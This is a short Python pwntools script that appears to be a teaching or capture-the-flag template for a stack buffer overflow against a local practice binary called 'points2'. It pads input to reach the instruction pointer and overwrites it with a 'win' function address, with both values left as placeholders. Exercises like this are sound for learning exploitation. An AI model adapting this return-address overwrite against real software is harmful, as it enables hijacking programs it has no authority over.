from pwn import * # import pwntools library

target = process("./points2") # start the program

target.recv() # recieve input from prgram

payload = b"A" * X # replace X with the number of bytes we need to get to the instruciont pointer
payload += p64(X) # replace X with address of win functoin. Don't forget the 0x 

target.sendline(payload) # send our payload to the program
target.interactive() # interactive mode, we should see output from program


